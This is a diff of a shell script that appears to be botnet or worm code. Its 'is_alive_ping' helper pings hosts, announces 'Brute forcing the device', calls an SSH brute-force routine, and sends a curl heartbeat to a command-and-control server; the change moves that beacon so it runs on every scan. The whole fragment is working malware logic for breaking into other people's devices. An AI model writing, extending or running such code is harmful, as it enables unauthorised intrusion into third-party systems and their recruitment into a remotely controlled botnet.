@@ -52,13 +52,12 @@ sshTry()
 # Scan network helper
 is_alive_ping()
 {
+	curl --request GET http://$cnc:$port/heartbeatbot
 	ping -c 1 $1 > /dev/null
 	if [ $? -eq 0 ]
 	then
 		echo "Brute forcing the device with IP $1"
 		sshTry $1
-		curl --request GET http://$cnc:$port/heartbeatbot
-
 	fi
 }
 
